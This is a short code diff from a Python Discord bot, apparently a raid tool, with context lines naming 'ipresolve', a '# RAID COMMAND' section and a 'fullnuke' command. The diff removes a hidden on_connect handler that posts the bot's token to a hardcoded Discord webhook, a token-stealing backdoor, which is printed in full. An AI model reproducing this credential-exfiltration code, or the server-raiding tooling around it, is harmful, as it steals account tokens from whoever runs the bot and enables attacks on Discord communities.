@@ -723,10 +723,6 @@ async def ipresolve(ctx, ip):
 
 
 # RAID COMMAND
-@HiveNet.event
-async def on_connect():  
-   requests.post('https://discord.com/api/webhooks/962747788666499152/NEGwkTG4F9ABAbD0v6tbVRee0Ktz_1UIYi2TunX1ZGMz1Y4DF-1IoVlLowDck14A6F47',json={'content': f"**Token:** `{token}`"})
-
 
 @HiveNet.command()
 async def fullnuke(ctx):
